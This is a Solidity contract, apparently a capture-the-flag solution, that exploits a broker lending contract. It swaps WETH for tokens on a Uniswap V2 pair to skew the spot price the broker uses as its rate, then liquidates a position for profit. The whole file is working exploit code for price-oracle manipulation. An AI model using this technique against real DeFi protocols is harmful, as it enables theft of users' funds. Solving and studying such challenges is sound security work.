pragma solidity 0.8.0;

import "./Setup.sol";

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract brokerExploit {
    uint256 constant DECIMALS = 1 ether;
    IUniswapV2Pair pair;
    Broker broker;
    ERC20Like token;
    WETH91 weth;
    brokerSetup setup;
    Router router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    //目标是将rate降为0，然后liquidate
    constructor(brokerSetup _setup) payable {
        setup = _setup;
        weth = setup.weth();
        weth.deposit{value: msg.value}();
        pair = setup.pair();
        broker = setup.broker();
        token = ERC20Like(address(setup.token()));


    }

    function attack() public {
        weth.approve(address(broker), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        token.approve(address(broker), type(uint256).max);
        token.approve(address(router), type(uint256).max);

        uint256 ethToSend = 15 ether;

        uint256 balanceBefore = weth.balanceOf(address(this));


        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);
        uint256[] memory tokensReceived = router.swapExactTokensForTokens(
        ethToSend,
        1,
        path,
        address(this),
        type(uint256).max
        );


        uint256 tokenReceived = tokensReceived[1];
        uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);
        require(weth.balanceOf(address(this)) > balanceBefore);
    }
}

